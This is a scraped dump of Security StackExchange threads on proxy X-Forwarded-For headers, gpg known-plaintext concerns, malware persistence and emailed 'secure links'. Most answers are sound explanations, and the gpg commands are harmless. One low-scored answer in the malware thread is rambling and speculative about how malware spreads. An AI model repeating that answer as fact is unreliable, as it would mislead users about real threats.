<p>When using HTTP, the proxy can inject the <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For"" rel=""nofollow noreferrer""><code>X-Forwarded-For</code></a> header with the IP of the originator.</p>
<p>When you use HTTPS (HTTP+TLS), the proxy can't access the headers - as they are encrypted, and is thus unable to add the <code>X-Forwarded-For</code> headers.</p>
","0"
"262997","262997","Why is my IP address hidden over HTTPS but not HTTP while I'm behind a proxy?","<p>I am trying to connect to a supplier API but they have a whitelist of the IPs which can consume their API. I gave them my server IP so that they could add it to the whitelist but it is still not working.</p>
<p>I suspect this is coming from my company proxy which hides IP, so I did some tests : weirdly enough, I noticed that the real IP of my server could not be detected on most websites like &quot;who.is&quot; or &quot;whatismyipaddress.com&quot;. But as soon as I would try the same thing on websites using HTTP such as &quot;http://www.mon-ip.com/en/my-ip/&quot;, then the proxy is detected and my server IP is found out.</p>
<p>I don't have a very deep understanding of HTTP and HTTPS so I have no idea how using http makes it possible to detect the proxy and find out the real IP. I tried checking request headers and it doesn't seem that the IP is transmitted in HTTP requests...</p>
<p>I've looked up some topics on SO and couldn't manage to find anything closely related to that matter (best I found was <a href=""https://security.stackexchange.com/questions/36420/how-can-a-website-find-my-real-ip-address-while-im-behind-a-proxy"">How can a website find my real IP address while I&#39;m behind a proxy?</a> which is somehow confusing me even more). Would someone be able to enlighten me on how http makes it possible to detect proxies and find out the real IP being used ?</p>
","0","3","263007","<p>Whitelists on public HTTP(S) based APIs are usually layer 2, i.e. they care for the (public) IP address(es) which is trying to make a connection. I would have a hard time believing they would care for anything which is in an <code>X-Forwarded-For</code> header, as this would be extremely easy to spoof and provide little extra security.</p>
<p>So you will have to provide them the public IP of your company's proxy server to have this whitelisted, not the internal IP of your server. (I assume it's an internal one.) Please note, it may be the case that your company is using some battery of proxies or different Internet breakouts, so you need to be sure you have <em>all</em> potential public IP addresses whitelisted.</p>
","1"
"262997","262997","Why is my IP address hidden over HTTPS but not HTTP while I'm behind a proxy?","<p>I am trying to connect to a supplier API but they have a whitelist of the IPs which can consume their API. I gave them my server IP so that they could add it to the whitelist but it is still not working.</p>
<p>I suspect this is coming from my company proxy which hides IP, so I did some tests : weirdly enough, I noticed that the real IP of my server could not be detected on most websites like &quot;who.is&quot; or &quot;whatismyipaddress.com&quot;. But as soon as I would try the same thing on websites using HTTP such as &quot;http://www.mon-ip.com/en/my-ip/&quot;, then the proxy is detected and my server IP is found out.</p>
<p>I don't have a very deep understanding of HTTP and HTTPS so I have no idea how using http makes it possible to detect the proxy and find out the real IP. I tried checking request headers and it doesn't seem that the IP is transmitted in HTTP requests...</p>
<p>I've looked up some topics on SO and couldn't manage to find anything closely related to that matter (best I found was <a href=""https://security.stackexchange.com/questions/36420/how-can-a-website-find-my-real-ip-address-while-im-behind-a-proxy"">How can a website find my real IP address while I&#39;m behind a proxy?</a> which is somehow confusing me even more). Would someone be able to enlighten me on how http makes it possible to detect proxies and find out the real IP being used ?</p>
","0","3","263022","<p>Ok I think that I have found the answer to my question. It all comes down to my company using Zscaler.</p>
<p>It is said in the doc that :</p>
<blockquote>
<p>ZIA
acts as an inline proxy: Zscaler terminates the original connection from the customer’s device or network
and initiates a new, direct connection to the destination content server on behalf of the user. The source IP
address seen by the content server is a public-egress IP address from the Zscaler data center, and not the original IP address of the enterprise user’s device.</p>
</blockquote>
<p>And it is also said that :</p>
<blockquote>
<p>XFF (x-forwarded-for) is inserted by default for all HTTP traffic going through Zscaler. If the destination application or content
server can read and interpret the incoming XFF header, it can apply its source IP-address-based application access rules.</p>
</blockquote>
<p>So I still don't know why I am not seeing the XFF header when checking my requests, but that's the most plausible explaination.</p>
","1"
"262994","262994","Does knowing how an encrypted file changed make it vulnerable?","<h2>Scenario</h2>
<p>The following bash commands create an empty file <code>test.txt</code>, encrypt it using a default algorithm to <code>test1.gpg</code>, then append the line <code>new line</code> to the original file and encrypt it again to <code>test2.gpg</code>. Each of the <code>gpg</code> commands prompts the user to enter an encryption key, which is not printed to the terminal.</p>
<pre><code>$ touch test.txt
$ gpg --output test1.gpg -c test.txt
$ echo &quot;new line&quot; &gt;&gt; test.txt
$ gpg --output test2.gpg -c test.txt
$ ls
test1.gpg  test2.gpg  test.txt
</code></pre>
<p>Suppose that an attacker has obtained the encrypted files <code>test1.gpg</code> and <code>test2.gpg</code>, and also has obtained access to my shell history—that is, <strong>they know exactly how the decrypted versions of these files differ,</strong> namely, by the addition of the line <code>new line</code>.</p>
<p>Furthermore, suppose that the attacker knows (or guesses) that <strong>I entered the same encryption key at the prompt both times,</strong> but does not know the value of the key itself.</p>
<p><strong>Is this information enough to enable the attacker to recover <code>test.txt</code> in its entirety?</strong></p>
<h2>Scope of this question</h2>
<p>I am interested if <strong>encryption algorithms in general</strong> are designed to anticipate this sort of attack, but if there are differences among the various encryption algorithms out there, you may note that in your answer.</p>
<p>Alternatively, you may respond with respect to the default algorithm invoked by the shell commands above, which is described in <code>man gpg</code> as follows:</p>
<pre><code>       -c     Encrypt with a symmetric cipher using a passphrase. The  default  symmetric  cipher
              used  is AES-128, but may be chosen with the --cipher-algo option. ...
</code></pre>
<h2>Why I think this question has merit</h2>
<p>Many cloud storage services offer some form of encryption, but there are also many common file-manipulation tasks, such as as updating a date, that could enable an attacker to guess exactly what changes were made.</p>
<h2>Follow-up questions</h2>
<ul>
<li><p>Does the vulnerability change depending on the type of edit, e.g. appending versus prepending versus modifying content in the middle of the file versus something else?</p>
</li>
<li><p>What if <em>many</em> sample edits are available—say, 10, 10 thousand, or a million?</p>
</li>
</ul>
<h2>Additional info</h2>
<pre><code>$ gpg --version
gpg (GnuPG) 2.2.19
libgcrypt 1.8.5
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;https://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Home: ~/.gnupg
Supported algorithms:
Pubkey: RSA, ELG, DSA, ECDH, ECDSA, EDDSA
Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
        CAMELLIA128, CAMELLIA192, CAMELLIA256
Hash: SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224
Compression: Uncompressed, ZIP, ZLIB, BZIP2
</code></pre>
","3","3","262999","<p>This question is plausibly better suited to crypto.SE, but there is of course overlap. The short answer is almost certainly &quot;yes, modern ciphers are designed to be secure against all known-plaintext attacks, including modification&quot;. In general, a &quot;crib&quot; (a chunk of known text at a known position in the message) isn't enough to meaningfully impact the security of modern ciphers; even if all but one byte of the message is known that last byte should be unguessable. That's true whether or not you know a prior state of the message. However, I admit I don't know of any studies specifically aimed at either proving that modification is safe, or reducing it to a known-safe operation.</p>
<p>It's also worth noting that &quot;encryption algorithms in general&quot; encompasses a lot of things that are not necessarily secure against cribs; cryptography people just always tell people to never use the insecure constructions. People don't always listen (or bother to check with a cryptography person at all) though, of course. For example, any block cipher in ECB mode is potentially vulnerable in a situation like this; if the attacker knows the plaintext of any given block, and any other given block has the same ciphertext, then the attacker knows the plaintext of that other block as well. This is one of the reasons you should never use ECB, but it does exist nonetheless and crops up occasionally in production code.</p>
<p>Also, even with a secure cipher/mode/etc., there's some information leaking here anyhow. For example, encryption doesn't hide the message length very well (sometimes doesn't hide it at all, with e.g. stream ciphers), so knowing that you added 9 bytes (counting the newline) to the file would allow them to learn things about the original length (assuming they can't just immediately tell that it's empty, which sometimes they could). For example, with a 128-bit block (like AES and some other ciphers use), this would not change the message length for the most common padding scheme - it would still be one block - so the attacker would know the original file was at most 6 bytes long (if the new message was a total of 16 bytes or more, there would be a second block even if it's all padding). With a 64-bit block (used by all forms of DES and some other ciphers), it would change the file from one block to two blocks, once again revealing that the original was at most 6 bytes long (which is slightly more info than they knew before, which was that the original was at most 7 bytes long).</p>
","2"
"262994","262994","Does knowing how an encrypted file changed make it vulnerable?","<h2>Scenario</h2>
<p>The following bash commands create an empty file <code>test.txt</code>, encrypt it using a default algorithm to <code>test1.gpg</code>, then append the line <code>new line</code> to the original file and encrypt it again to <code>test2.gpg</code>. Each of the <code>gpg</code> commands prompts the user to enter an encryption key, which is not printed to the terminal.</p>
<pre><code>$ touch test.txt
$ gpg --output test1.gpg -c test.txt
$ echo &quot;new line&quot; &gt;&gt; test.txt
$ gpg --output test2.gpg -c test.txt
$ ls
test1.gpg  test2.gpg  test.txt
</code></pre>
<p>Suppose that an attacker has obtained the encrypted files <code>test1.gpg</code> and <code>test2.gpg</code>, and also has obtained access to my shell history—that is, <strong>they know exactly how the decrypted versions of these files differ,</strong> namely, by the addition of the line <code>new line</code>.</p>
<p>Furthermore, suppose that the attacker knows (or guesses) that <strong>I entered the same encryption key at the prompt both times,</strong> but does not know the value of the key itself.</p>
<p><strong>Is this information enough to enable the attacker to recover <code>test.txt</code> in its entirety?</strong></p>
<h2>Scope of this question</h2>
<p>I am interested if <strong>encryption algorithms in general</strong> are designed to anticipate this sort of attack, but if there are differences among the various encryption algorithms out there, you may note that in your answer.</p>
<p>Alternatively, you may respond with respect to the default algorithm invoked by the shell commands above, which is described in <code>man gpg</code> as follows:</p>
<pre><code>       -c     Encrypt with a symmetric cipher using a passphrase. The  default  symmetric  cipher
              used  is AES-128, but may be chosen with the --cipher-algo option. ...
</code></pre>
<h2>Why I think this question has merit</h2>
<p>Many cloud storage services offer some form of encryption, but there are also many common file-manipulation tasks, such as as updating a date, that could enable an attacker to guess exactly what changes were made.</p>
<h2>Follow-up questions</h2>
<ul>
<li><p>Does the vulnerability change depending on the type of edit, e.g. appending versus prepending versus modifying content in the middle of the file versus something else?</p>
</li>
<li><p>What if <em>many</em> sample edits are available—say, 10, 10 thousand, or a million?</p>
</li>
</ul>
<h2>Additional info</h2>
<pre><code>$ gpg --version
gpg (GnuPG) 2.2.19
libgcrypt 1.8.5
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;https://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Home: ~/.gnupg
Supported algorithms:
Pubkey: RSA, ELG, DSA, ECDH, ECDSA, EDDSA
Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
        CAMELLIA128, CAMELLIA192, CAMELLIA256
Hash: SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224
Compression: Uncompressed, ZIP, ZLIB, BZIP2
</code></pre>
","3","3","263003","<p>Knowing how an encrypted file changed doesn't give up much in deciphering the encrypted data, assuming that modern cryptographic protocols and strong key material are in use. (I'll ignore the obvious leaking of plaintext data in the command-line history!)</p>
<p>As long as the key in use is randomised with high degree of uncertainty (aka high-entropy) the encrypted output produced will be as well. Subsequent messages encrypted with the same key generally add some additional entropy to the &quot;starting position&quot;, which leads to different output from the very first byte of encrypted data. This can be called the <em>initialilsation vector</em> (aka IV) or <em>nonce</em> depending on the context, and it must be unique for each discrete key+message pair.</p>
<ul>
<li>In the event that the IV or nonce is re-used, then there is the potential for outputs to be the same up to the point that the plaintext data starts to change.</li>
<li>In a block cipher that uses some form of <em>chaining</em>, all subsequent data will differ because the earlier blocks feed into the later ones (see ^6).</li>
<li>This is a greater weakness for a streaming cipher or counter-mode block cipher because the XOR of the plaintexts is equal to the XOR of the ciphertexts (see ^4 and ^7).</li>
</ul>
<p>Having said that, as long as these IV/ nonce values remain unique, even a million re-uses of the key likely won't have an impact on its discoverability, <strong>as long as the maximum data limits are adhered to</strong> (many, many gigabytes). Be sure to check the limits of the cipher.</p>
<p><strong>WITH RESPECT TO <code>gpg</code> AND ITS DEFAULTS</strong></p>
<p>Your command as listed is reasonably secure because the ciphertext will differ every time the file is re-encrypted (a block of random data, plus two bytes, is prepended each time the output is generated).</p>
<p>In the following modified command I've increased the output space of the hash digest through the use of <code>--Xdigest-algo=SHA512</code> at all points where this is relevant. (This may break compatibility with other implementations or older versions.)</p>
<p>You could consider embedding a recipient signature in the output, which allows file verification without decryption. I've also disabled compression with <code>--compress-algo=none</code> in this example, if that risk is of a concern (see discussion in ^1).</p>
<pre><code>gpg --sign --output test.gpg -c --compress-algo=none --s2k-mode=3 --s2k-count=65011712 --s2k-digest-algo=SHA512 --digest-algo=SHA512 --cert-digest-algo=SHA512 test.txt
</code></pre>
<p><strong>NOTE ON <code>S2K</code> PASSWORD-BASED KDF</strong></p>
<p>Even with the same password, a new random 8-byte salt is generated on each invocation when using <code>--s2k-mode=3</code> (discussed subsequently) which has the effect of changing the encryption key.</p>
<p>However, the way <code>gpg</code> derives the encryption key from the password is somewhat dated by modern standards, <a href=""https://security.stackexchange.com/search?q=argon2"">see for eg. <em>Argon2</em> pwd kdfs</a>. In the modified command I've configured the password-based key derivation function to be as strong as possible allowed in this version via <code>--s2k-X</code> flags (this choice should be reviewed on newer versions). Since this kdf isn't very hard by modern standards <strong>your typed password should be as strong as humanly possible</strong> (see ^8).</p>
<p>Another option might be to use another mechanism to produce a password string from a harder kdf (eg. using <code>openssl</code> or <code>cryptsetup</code>) then provide this via stdin with the <code>--passphrase-fd=0</code> option.</p>
<p><strong>MORE READING</strong></p>
<ol>
<li><p><a href=""https://security.stackexchange.com/q/43413"">Is it safe for GPG to compress all messages prior to encryption by default</a> <em>Marthenal and friends'13</em> discuss compression as a potential source of vulnerability.</p>
</li>
<li><p><a href=""https://security.stackexchange.com/q/89248"">GnuPG symmetric encryption yields different output</a> <em>rdanitz and friends'15</em> give insight into why the output is always different.</p>
</li>
<li><p>rfc4880 OpenPGP Message Format, linked to <a href=""https://www.rfc-editor.org/rfc/rfc4880#section-9.2"" rel=""nofollow noreferrer"">Section 9.2 Symmetric-Key Algorithms</a>, and also <em>Section 13.9 OpenPGP CFB Mode</em></p>
</li>
<li><p>if the IV didn't change as well then the XOR of the two plaintext versions of the same block would be leaked (<a href=""https://security.stackexchange.com/a/239938"">via the XOR of the two ciphertexts</a> <em>MechMK1 '20</em>).</p>
</li>
<li><p>My very shallow overview (2020) of GoCryptFS: <a href=""https://security.stackexchange.com/a/245556"">https://security.stackexchange.com/a/245556</a></p>
</li>
<li><p><a href=""https://en.wikipedia.org/wiki/Block_cipher"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/Block_cipher</a></p>
</li>
<li><p><a href=""https://en.wikipedia.org/wiki/Stream_cipher"" rel=""nofollow noreferrer"">https://en.wikipedia.org/wiki/Stream_cipher</a></p>
</li>
<li><p>This answer discusses <a href=""https://security.stackexchange.com/a/112839"">forcing S2K</a> <em>Leek'16</em> with the up-shot being that it rests on the strength of the input password, also see the open <code>hashcat</code> issue to add <a href=""https://github.com/hashcat/hashcat/issues/60"" rel=""nofollow noreferrer"">support for GPG/PGP private key</a></p>
</li>
</ol>
","0"
"262994","262994","Does knowing how an encrypted file changed make it vulnerable?","<h2>Scenario</h2>
<p>The following bash commands create an empty file <code>test.txt</code>, encrypt it using a default algorithm to <code>test1.gpg</code>, then append the line <code>new line</code> to the original file and encrypt it again to <code>test2.gpg</code>. Each of the <code>gpg</code> commands prompts the user to enter an encryption key, which is not printed to the terminal.</p>
<pre><code>$ touch test.txt
$ gpg --output test1.gpg -c test.txt
$ echo &quot;new line&quot; &gt;&gt; test.txt
$ gpg --output test2.gpg -c test.txt
$ ls
test1.gpg  test2.gpg  test.txt
</code></pre>
<p>Suppose that an attacker has obtained the encrypted files <code>test1.gpg</code> and <code>test2.gpg</code>, and also has obtained access to my shell history—that is, <strong>they know exactly how the decrypted versions of these files differ,</strong> namely, by the addition of the line <code>new line</code>.</p>
<p>Furthermore, suppose that the attacker knows (or guesses) that <strong>I entered the same encryption key at the prompt both times,</strong> but does not know the value of the key itself.</p>
<p><strong>Is this information enough to enable the attacker to recover <code>test.txt</code> in its entirety?</strong></p>
<h2>Scope of this question</h2>
<p>I am interested if <strong>encryption algorithms in general</strong> are designed to anticipate this sort of attack, but if there are differences among the various encryption algorithms out there, you may note that in your answer.</p>
<p>Alternatively, you may respond with respect to the default algorithm invoked by the shell commands above, which is described in <code>man gpg</code> as follows:</p>
<pre><code>       -c     Encrypt with a symmetric cipher using a passphrase. The  default  symmetric  cipher
              used  is AES-128, but may be chosen with the --cipher-algo option. ...
</code></pre>
<h2>Why I think this question has merit</h2>
<p>Many cloud storage services offer some form of encryption, but there are also many common file-manipulation tasks, such as as updating a date, that could enable an attacker to guess exactly what changes were made.</p>
<h2>Follow-up questions</h2>
<ul>
<li><p>Does the vulnerability change depending on the type of edit, e.g. appending versus prepending versus modifying content in the middle of the file versus something else?</p>
</li>
<li><p>What if <em>many</em> sample edits are available—say, 10, 10 thousand, or a million?</p>
</li>
</ul>
<h2>Additional info</h2>
<pre><code>$ gpg --version
gpg (GnuPG) 2.2.19
libgcrypt 1.8.5
Copyright (C) 2019 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;https://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

Home: ~/.gnupg
Supported algorithms:
Pubkey: RSA, ELG, DSA, ECDH, ECDSA, EDDSA
Cipher: IDEA, 3DES, CAST5, BLOWFISH, AES, AES192, AES256, TWOFISH,
        CAMELLIA128, CAMELLIA192, CAMELLIA256
Hash: SHA1, RIPEMD160, SHA256, SHA384, SHA512, SHA224
Compression: Uncompressed, ZIP, ZLIB, BZIP2
</code></pre>
","3","3","263016","<p>The short answer is no, and this is a fundamental property of (non-broken) encryption schemes. Intuitively speaking, if you don't know the decryption key, the only information you can get from a ciphertext is the length of the plaintext. The formal statement of this property is <a href=""https://en.wikipedia.org/wiki/Semantic_security"" rel=""nofollow noreferrer"">semantic security</a>.</p>
<p>In your scenario, anyone can tell that <code>test.txt</code> is empty, since the ciphertext exposes the length of the plaintext. However, as soon as <code>test.txt</code> is non-empty, there is no way to tell its contents from the ciphertext, even if the attacker knows the ciphertext for related plaintexts. In fact, suppose that the attacker can choose ciphertexts and get any number of ciphertexts decrypted apart from <code>test1.gpg</code> itself (a <a href=""https://en.wikipedia.org/wiki/Chosen-ciphertext_attack"" rel=""nofollow noreferrer"">chosen-ciphertext attack</a>). Even then, the attacker won't be able to know anything about the plaintext of <code>test1.gpg</code> other than its length.</p>
<p>With PGP/GnuPG, you do need to <a href=""https://security.stackexchange.com/questions/43413/is-it-safe-for-gpg-to-compress-all-messages-prior-to-encryption-by-default"">be careful about compression</a>. The encryption itself is secure, but the sequence compression+encryption is not, because the compressibility of the message, and therefore the length of what is encrypted, depends on the contents.</p>
<p>Most encryption schemes that are used in practice are semantically secure. However, there is one exception: disk encryption usually uses ciphers that are not semantically secure, for performance and storage space reasons¹. (<a href=""https://en.wikipedia.org/wiki/Disk_encryption_theory#XTS"" rel=""nofollow noreferrer"">XTS</a> is popular.) This is generally ok because the typical threat model for disk encryption does not include chosen-ciphertext attacks, only chosen-plaintext attacks (if even that). Disk encryption is only intended to protect against theft of the storage media, and once the media is stolen it doesn't get used anymore. If an attacker manages to make copies of multiple versions of the ciphertext of a disk sector, they may be able to obtain partial information about its contents.</p>
<p>¹ <sub> Since the attack model excludes chosen-ciphertext attacks, disk encryption is usually unauthenticated, which saves the space to store authentication tags and the need to check authentication tags when reading back. And since the attack model assumes the attacker only sees a single version of the ciphertext, disk encryption usually reuses the same IV throughout the history of a sector, instead of storing a new IV each time. </sub></p>
","3"
"262738","262738","Do some malware/viruses stay on the internet basically indefinitely?","<p>Biological viruses stay in the population essentially indefinitely. We have immune systems, but this somehow doesn't cause virus strains to completely disappear after some time, as everyone's immune system gets rid of them. Rather they decrease in prevalence in the population, and then later possibly mutate and increase again.</p>
<p>Are some computer viruses/malware analogous in this respect, that they stay active in computers on the internet essentially indefinitely?</p>
<p>I understand that computer malware does not mutate like biological viruses/bacteria, I didn't intend it to be a strong analogy. I also understand that &quot;the internet&quot; is not a place where malware is stored but rather in personal computers or datacenters or other storage devices. <strong>I am just asking a question whether it is the case that computer malware stays active indefinitely or not</strong>, not assuming a particular reason for why this would be the case.</p>
","-1","3","262739","<p>Computer malware, including self-replicating and self-propagating software, do not evolve by themselves. Humans modify them. Computer &quot;viruses&quot; have very little in common with biological viruses outside their name.</p>
<p>Samples of malware are kept by antivirus companies and researchers. Some are often executed in controlled environments to test the effectiveness of antivirus software.</p>
<p>Since computers countermeasures to malware (security patches, antivirus definitions, etc.) only improve with time, an old virus would not propagate better today. Meanwhile, biological immune systems become less sensitive with time to old pathogens.</p>
<p>So, if you take an old self-propagating virus and execute it on a computer connected to internet, it will not propagate better than it did before. On the other hand, if you try to connect a computer with a fresh installation of Windows XP directly to internet (on IPv4), it will become infected in minutes. Because as long as there are Windows XP computers infected and connected to internet, there will be malware trying to spread to other Windows XP computers.</p>
<p><em>Note:</em> Some malware &quot;mutate&quot;, but that's an antivirus evasion technique. Those mutations have nothing in common with biological mutations needed for evolution.</p>
","0"
"262738","262738","Do some malware/viruses stay on the internet basically indefinitely?","<p>Biological viruses stay in the population essentially indefinitely. We have immune systems, but this somehow doesn't cause virus strains to completely disappear after some time, as everyone's immune system gets rid of them. Rather they decrease in prevalence in the population, and then later possibly mutate and increase again.</p>
<p>Are some computer viruses/malware analogous in this respect, that they stay active in computers on the internet essentially indefinitely?</p>
<p>I understand that computer malware does not mutate like biological viruses/bacteria, I didn't intend it to be a strong analogy. I also understand that &quot;the internet&quot; is not a place where malware is stored but rather in personal computers or datacenters or other storage devices. <strong>I am just asking a question whether it is the case that computer malware stays active indefinitely or not</strong>, not assuming a particular reason for why this would be the case.</p>
","-1","3","262748","<p>Sure, there have been worms that stay silent and propagate until some trigger is met. Either a time trigger or when the worm lands on a machine with certain desired characteristics. Until then, they try to spread as far as they can.</p>
<p>Stuxnet is one such famous worm.</p>
<p>The problem is that antivirus programs end up learning about these worms and destroy them. So, &quot;indefinitely&quot; requires a lot of conditions to be met. Mostly that the device does not have antivirus and remains active and connected to the internet for a long period of time.</p>
<p>Are there still Stuxnet-infected devices out there? Maybe. But after some time, it doesn't matter.</p>
","0"
"262738","262738","Do some malware/viruses stay on the internet basically indefinitely?","<p>Biological viruses stay in the population essentially indefinitely. We have immune systems, but this somehow doesn't cause virus strains to completely disappear after some time, as everyone's immune system gets rid of them. Rather they decrease in prevalence in the population, and then later possibly mutate and increase again.</p>
<p>Are some computer viruses/malware analogous in this respect, that they stay active in computers on the internet essentially indefinitely?</p>
<p>I understand that computer malware does not mutate like biological viruses/bacteria, I didn't intend it to be a strong analogy. I also understand that &quot;the internet&quot; is not a place where malware is stored but rather in personal computers or datacenters or other storage devices. <strong>I am just asking a question whether it is the case that computer malware stays active indefinitely or not</strong>, not assuming a particular reason for why this would be the case.</p>
","-1","3","262752","<p>There are actually plenty of studies (and previous attacks) to back this with a little research and practice for the next 10-20 years of learning what capabilities are/were possible.</p>
<p>For instance, sophisticated rootkits, worms, fileless malware, memory-resident injections, certain payload residing in trojans etc., can be coded to spread themselves laterally from devices (phones, voice commands, routers, even infrared [being little as kilobytes] of converted hex to implement/sniff addresses) anything with command prints/terminals, certain hardware sensors, random access memory or a storage capacity, and/or an internet connection.</p>
<p>Then you have code such as poly and metamorphic which does just that, except you want to know if it just “floats” in the binary atmosphere, and what your curiosity is digging for will be a more serious thing thanks to machine learning in the next decade or so; a scary yet beautiful structured code, so if you’re swimming in cyberspace and worried of catching a “virus” it kind of is a thing if your IP is designated (programmed, shared, else;if’d), if the servers you tunnel through are infected/spliced, if you use browsers that accept certain scripts, sensors, outputs, fonts, payment forms; or you view or click on something of course, but again to originate, it will more then likely need a host, frequency, or electricity.</p>
","-1"
"262634","262634","Is there any security benefit from emailing a ""secure link""?","<p>Sometimes I receive email messages from organisations I'm involved with saying something like:</p>
<blockquote>
<p>Alice at AnyCo has sent you a secure message</p>
</blockquote>
<p>Along with a link to access said message. Sometimes I'm then asked to create an account. The last one even decided to use &quot;2FA&quot; and send me a code to the same email address before I could log in. The companies which provide this service (for example <a href=""https://www.kiteworks.com/"" rel=""noreferrer"">Kiteworks</a>) seem to act like it's the responsible way to send documents.</p>
<p>My impression is that this amounts to &quot;security theatre&quot; and does nothing to prevent unauthorised access to the file by third parties, or tampering with the contents of the file, compared with simply sending an attachment. That is usually what is implied by these services.</p>
","32","5","262635","<p>It provides some benefits in that the sensitive contents are stored on the server, rather than in the body of the email. This means that the link can be revoked to block access (for example, if the email was sent to the incorrect address) - whereas once an email has been sent, there's no reliable way to recall it.</p>
<p>It also allows the file sharing platform to implement some additional security controls (such as IP restrictions, or only allowing federate authentication) - so the link by itself might not have any value if an attacker can't reach or authenticate on the site.</p>
<p>But in a lot of cases, it is just security theatre (especially if the &quot;secure&quot; platform doesn't enforce conditional access, MFA, risky login detection, and all the other security features that the email system does). It also trains users to click links in emails and then enter their credentials, which is obviously a very bad habit to get into. A lot of the time, these &quot;secure&quot; platforms are used for compliance reasons, rather than because they're addressing a realistic threat.</p>
","48"
"262634","262634","Is there any security benefit from emailing a ""secure link""?","<p>Sometimes I receive email messages from organisations I'm involved with saying something like:</p>
<blockquote>
<p>Alice at AnyCo has sent you a secure message</p>
</blockquote>
<p>Along with a link to access said message. Sometimes I'm then asked to create an account. The last one even decided to use &quot;2FA&quot; and send me a code to the same email address before I could log in. The companies which provide this service (for example <a href=""https://www.kiteworks.com/"" rel=""noreferrer"">Kiteworks</a>) seem to act like it's the responsible way to send documents.</p>
<p>My impression is that this amounts to &quot;security theatre&quot; and does nothing to prevent unauthorised access to the file by third parties, or tampering with the contents of the file, compared with simply sending an attachment. That is usually what is implied by these services.</p>
","32","5","262636","<p>The SMTP protocol is intended to exchange data in clear text over possibly a number of relays. In addition to the common data interception attacks, each and every relay could examine the message (and if found important keep a copy of it). Furthermore, many end users do not own their own mail server, so the message is kept (still in clear text) on their mail provider server.</p>
<p>And all those attacks cannot be detected, either by the sender of by the receiver.</p>
<p>In contrast when only a link is sent, the message is only kept on the sender server, and is (normally) downloaded through HTTPS and because of that cannot be easily intercepted.</p>
<p>That being said, as the link is sent in a simple mail, the link itself can be intercepted and an attacker could use it to steal the sensitive data. But at least if the real user also uses the link, the sender could detect 2 different connections and be aware of the attack.</p>
<p>The correct way would be to securely identify the recipient <strong>before</strong> a message is sent there. This is commonly used by banks: they send a rather <em>innocent</em> message with that simple information: a message is available. Then the user has to use its account (along with a secure connection way) to download the message.</p>
<hr />
<p>BTW, the really secure way would be to use X509 certificates. That way S/MIME allows to send a signed and encrypted message that only the real recipients will be able to decrypt. But unfortunately, X509 certificates are seldom used outside closed organizations...</p>
","13"
"262634","262634","Is there any security benefit from emailing a ""secure link""?","<p>Sometimes I receive email messages from organisations I'm involved with saying something like:</p>
<blockquote>
<p>Alice at AnyCo has sent you a secure message</p>
</blockquote>
<p>Along with a link to access said message. Sometimes I'm then asked to create an account. The last one even decided to use &quot;2FA&quot; and send me a code to the same email address before I could log in. The companies which provide this service (for example <a href=""https://www.kiteworks.com/"" rel=""noreferrer"">Kiteworks</a>) seem to act like it's the responsible way to send documents.</p>
<p>My impression is that this amounts to &quot;security theatre&quot; and does nothing to prevent unauthorised access to the file by third parties, or tampering with the contents of the file, compared with simply sending an attachment. That is usually what is implied by these services.</p>
","32","5","262645","<p>Not only do these things lack any significant security benefit. One thing that's underappreciated is the strong <strong>security disadvantage</strong> and imbalance of power it creates against the recipient. They have no means of ensuring the document behind the &quot;secure link&quot; is the same as it was at the moment the email arrived and that it has not been alterred by the sender or some third party with access to the &quot;secure document&quot; platform between the time the email was sent and when they read (or later re-read) it. If the document were included as an attachment, the recipeint would possess a permanent copy from the moment of receipt, and depending on how DKIM was used, possibly even a cryptographic signature establishing authenticity/non-repudiation of the document.</p>
<p>As noted by bta in the comments, another way these things harm the recipient's security is by bypassing any scanning for malware, etc. that would be done for direct attachments but not for off-site links. And as ThoriumBR seems to have suggested, these kinds of &quot;secure links&quot; may train recipients to get phished - by normalizing following links to documents and possibly entering private information or performing authentication processes with the site.</p>
","9"
"262634","262634","Is there any security benefit from emailing a ""secure link""?","<p>Sometimes I receive email messages from organisations I'm involved with saying something like:</p>
<blockquote>
<p>Alice at AnyCo has sent you a secure message</p>
</blockquote>
<p>Along with a link to access said message. Sometimes I'm then asked to create an account. The last one even decided to use &quot;2FA&quot; and send me a code to the same email address before I could log in. The companies which provide this service (for example <a href=""https://www.kiteworks.com/"" rel=""noreferrer"">Kiteworks</a>) seem to act like it's the responsible way to send documents.</p>
<p>My impression is that this amounts to &quot;security theatre&quot; and does nothing to prevent unauthorised access to the file by third parties, or tampering with the contents of the file, compared with simply sending an attachment. That is usually what is implied by these services.</p>
","32","5","262652","<p>As weak as it is, you need to consider that the intended recipients are in majority layman with little security or computer knowledge. You cannot expect them to install and use PGP or similar more secure interactions; they are already stretched by a link with a code in a second email.<br />
Under the circumstances, those companies try to do the best possible within these limitations. Is it secure? No. But better than a single email.</p>
","0"
"262634","262634","Is there any security benefit from emailing a ""secure link""?","<p>Sometimes I receive email messages from organisations I'm involved with saying something like:</p>
<blockquote>
<p>Alice at AnyCo has sent you a secure message</p>
</blockquote>
<p>Along with a link to access said message. Sometimes I'm then asked to create an account. The last one even decided to use &quot;2FA&quot; and send me a code to the same email address before I could log in. The companies which provide this service (for example <a href=""https://www.kiteworks.com/"" rel=""noreferrer"">Kiteworks</a>) seem to act like it's the responsible way to send documents.</p>
<p>My impression is that this amounts to &quot;security theatre&quot; and does nothing to prevent unauthorised access to the file by third parties, or tampering with the contents of the file, compared with simply sending an attachment. That is usually what is implied by these services.</p>
","32","5","262687","<p>Another factor here--this approach greatly reduces the risk of casual discovery of the information.</p>
